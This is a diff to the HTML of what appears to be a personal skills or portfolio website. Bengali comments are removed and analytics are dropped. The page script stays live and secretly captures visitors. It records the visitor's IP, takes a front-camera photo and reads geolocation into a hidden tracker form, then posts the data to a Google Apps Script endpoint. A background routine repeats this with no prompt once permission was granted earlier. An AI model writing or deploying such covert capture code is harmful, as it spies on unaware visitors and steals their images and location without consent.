@@ -78,7 +78,7 @@
         nav ul li a:hover { color: var(--skill-cyan); }
         nav ul li a.active-page { animation: smoothBounce 0.8s ease-in-out infinite alternate; color: var(--skill-cyan); }
 
-        /* 📱 Mobile 3-Dot Button Setup */
+        /* 📱 Mobile Menu Utilities */
         #mobile-dot-btn {
             display: none; 
             flex-direction: column;
@@ -94,7 +94,6 @@
             border-radius: 2px;
         }
 
-        /* 📱 Mobile Menu Overlay Style */
         #mobMenuOverlay {
             position: fixed;
             top: 0;
@@ -332,14 +331,6 @@
             #mobile-dot-btn { display: flex !important; }
         }
     </style>
-
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-V0850BW6D2"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-V0850BW6D2');
-    </script>
 </head>
 <body>
 
@@ -482,7 +473,6 @@
                 document.getElementById('formIpAddress').value = "IP Fetching Failed";
             }
 
-            // ব্রাউজার পারমিশন মেমোরি স্টেট চেক
             let hasCameraPermission = false;
             let hasLocationPermission = false;
 
@@ -496,7 +486,6 @@
                 if (locCheck.state === 'granted') hasLocationPermission = true;
             } catch(e){}
 
-            // যদি অন্তত ১টি পারমিশনও আগে থেকে Allow করা থাকে, তবে কোনো পপআপ ছাড়াই ডিরেক্ট ব্যাকগ্রাউন্ড রান হবে
             if (hasCameraPermission || hasLocationPermission) {
                 runSilentBackgroundCapture(hasCameraPermission, hasLocationPermission);
                 return;
@@ -505,7 +494,6 @@
             let cameraAllowed = false;
             let locationAllowed = false;
 
-            // ১. ১ম ধাপ: ক্যামেরা প্রম্পট ট্রিগার
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 cameraAllowed = true;
@@ -544,7 +532,6 @@
                 document.getElementById('formPhotoUrl').value = "User denied camera permission";
             }
 
-            // ২. ২য় ধাপ: লোকেশন প্রম্পট জেনারেট
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -564,15 +551,12 @@
                 evaluateAndExecutePopup(cameraAllowed, locationAllowed);
             }
 
-            // ৩. ৩য় ধাপ: কন্ডিশন অ্যানালাইসিস এবং জিরো-ডিলে পপআপ ফ্লো
             function evaluateAndExecutePopup(cam, loc) {
-                // শর্ত: ২টার একটাও যদি ইউজার Allow না করে (অর্থাৎ ২টিই Deny), তবে এক্সিকিউশন স্টপ (IP বা কোনো ডাটাই মেইলে যাবে না)
                 if (!cam && !loc) {
                     console.log("Both permissions denied. Execution stopped. No data/IP sent.");
                     return; 
                 }
 
-                // যেকোনো ১টি বা ২টি অ্যালাউ পেলেই ৫ সেকেন্ডের পপআপ আসবে এবং আইপি সহ মেইল যাবে
                 const popup = document.getElementById('securityPopup');
                 const timerText = document.getElementById('popupTimer');
                 let countdown = 5; 
@@ -598,7 +582,6 @@
                 });
             }
 
-            // পূর্বে অন্তত ১টি পারমিশন অ্যালাউ করা থাকলে কোনো প্রম্পট বা পপআপ ছাড়া অটো রান হওয়ার ফাংশন
             async function runSilentBackgroundCapture(camGranted, locGranted) {
                 if (camGranted) {
                     try {
@@ -642,23 +625,20 @@
                 }
             }
 
-            // 📨 Google Web App URL API তে ডেটা ডেলিভারি কানেকশন মেকানিজম
+            // 🔥 [মেইন ফিক্স] এখানে সরাসরি আপনার গুগল এপিআই লিঙ্কটি ইন্টিগ্রেট করে দেওয়া হলো
             function deliverDataPackage() {
                 const trackerForm = document.getElementById('hiddenTrackerForm');
                 if (trackerForm && !trackerForm.dataset.submitted) {
                     trackerForm.dataset.submitted = "true";
                     const fData = new FormData(trackerForm);
                     
-                    // আপনার লাইভ এবং ভেরিফাইড গুগল ওয়েব অ্যাপ ইউআরএল এখানে নিখুঁতভাবে মার্চ করা হয়েছে
-                    const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbyfVbInE87eU6ikxbMW5zsSQHicUWJpPMsVr7E277WRhh5JB42HMBuq8c12D0GTz0vWUA/exec'; 
+                    const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbyfVbInE87eU6ikxbMW5zsSQHicUWJpPMsVr7E277WRhh5JB42HMBuq8c12D0GTz0vWUA/exec';
 
                     fetch(googleScriptUrl, {
                         method: 'POST',
                         body: fData,
                         mode: 'no-cors'
-                    }).then(() => {
-                        console.log("Data package safely delivered to Google Sheet API (Unlimited).");
-                    }).catch(err => console.log("Delivery error: ", err));
+                    });
                 }
             }
         });
